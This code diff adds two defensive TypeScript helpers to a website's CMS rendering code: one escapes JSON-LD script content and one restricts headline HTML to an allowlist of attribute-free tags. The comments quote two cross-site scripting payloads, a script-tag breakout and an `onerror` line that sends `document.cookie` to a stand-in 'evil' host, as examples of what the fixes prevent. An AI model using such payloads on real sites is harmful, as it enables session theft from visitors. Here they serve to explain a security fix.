@@ -30,6 +30,85 @@
  * emits is built here, not stored.
  */
 
+/**
+ * Serialise a value for a `<script type="application/ld+json">` block.
+ *
+ * NOT `JSON.stringify` on its own, and the difference is a cross-site
+ * scripting hole rather than a nicety.
+ *
+ * An HTML parser looking at the inside of a <script> element is not parsing
+ * JSON — it is scanning for the byte sequence `</script`, and it ends the
+ * element the moment it sees one, wherever it appears. `JSON.stringify` has
+ * no reason to care about that and does not escape it. So a CMS field
+ * containing
+ *
+ *   </script><script>fetch(...)</script>
+ *
+ * closed the JSON-LD block, opened a real one, and ran. The site's CSP allows
+ * `script-src 'unsafe-inline'` — it has to, for Astro's pre-paint theme
+ * script — so nothing downstream would have stopped it either.
+ *
+ * Escaping `<` and `>` into their uXXXX form is the fix. Those are valid JSON
+ * escapes, every consumer parses them back to the identical string, and the
+ * byte sequence the HTML parser scans for can no longer appear at all.
+ *
+ * U+2028 and U+2029 ride along for a different reason: both are legal inside
+ * a JSON string but are line terminators in JavaScript, so an unescaped one
+ * is a syntax error in any consumer that evaluates rather than parses.
+ *
+ * EDITING THIS: each replacement below must carry a DOUBLE backslash in the
+ * source. Written with one, it is a JavaScript escape that evaluates straight
+ * back to the character being replaced — every line becomes a silent no-op
+ * and the hole quietly reopens. That exact mistake was made once already.
+ */
+export function ldJson(value: unknown): string {
+  return JSON.stringify(value)
+    .replace(/</g, '\\u003c')
+    .replace(/>/g, '\\u003e')
+    .replace(/\u2028/g, '\\u2028')
+    .replace(/\u2029/g, '\\u2029');
+}
+
+/**
+ * A CMS string that is allowed a little formatting, and nothing else.
+ *
+ * WHY THIS EXISTS
+ *
+ * The hero headline was rendered with a bare `set:html`, straight from a
+ * Sanity `string` field with no validation on it. That is a stored cross-site
+ * scripting hole with an editor-shaped key: typing
+ *
+ *   <img src=x onerror=fetch('//evil/'+document.cookie)>
+ *
+ * into the Headline box put running JavaScript on the homepage for every
+ * visitor. The site's CSP cannot help — it allows `'unsafe-inline'` because
+ * Astro's pre-paint theme script needs it — and a phished Studio login is a
+ * far likelier way in than anything on the Supabase side, which is locked
+ * down properly.
+ *
+ * `set:html` was there for a real reason, though: headlines need a `<br>` to
+ * control where a line breaks, and an `<em>` for emphasis. Escaping the field
+ * outright would print the tags as text and take that away.
+ *
+ * So: escape EVERYTHING first, then put back a fixed list of tags that carry
+ * no attributes at all. Because the string is already escaped when the
+ * allowlist runs, the only `<` characters that can survive are the ones this
+ * function writes itself — there is no path by which an attribute, a URL or a
+ * second tag rides along. An `onerror` cannot exist on a tag whose entire
+ * permitted syntax is `<em>`.
+ *
+ * Adding to ALLOWED is safe as long as every entry stays attribute-free and
+ * is not `script`, `style`, `iframe`, `object`, `embed`, `form` or `a`.
+ */
+const ALLOWED = 'br|em|strong|b|i|sup|sub|u|s|small';
+
+export function inlineHtml(value: string | null | undefined): string {
+  return esc(String(value ?? '')).replace(
+    new RegExp(`&lt;(\\/?)(${ALLOWED})\\s*\\/?&gt;`, 'gi'),
+    (_whole, slash: string, tag: string) => `<${slash}${tag.toLowerCase()}>`
+  );
+}
+
 export type Tokens = Record<string, string | number>;
 
 const TOKEN = /\{\{(\w+)\}\}/g;
